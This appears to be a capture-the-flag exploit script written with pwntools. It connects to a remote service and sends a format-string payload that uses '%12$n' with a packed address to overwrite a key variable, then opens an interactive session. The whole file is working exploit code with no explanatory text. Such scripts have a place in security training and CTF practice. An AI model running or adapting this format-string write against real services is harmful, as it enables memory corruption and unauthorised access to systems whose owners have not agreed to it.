#!/usr/bin/python 
from pwn import *
# context.log_level = 'debug'
# p = process('pwn2')
p = remote("10.4.20.133",9902)
key = 0x60107C
p.recvuntil("input : ")
# gdb.attach(p,'b *0x4007bf') # break at printf
payload = "%12$pBBB" + "%12$nAAA" + p64(key)
p.sendline(payload)
p.recv()
p.interactive()

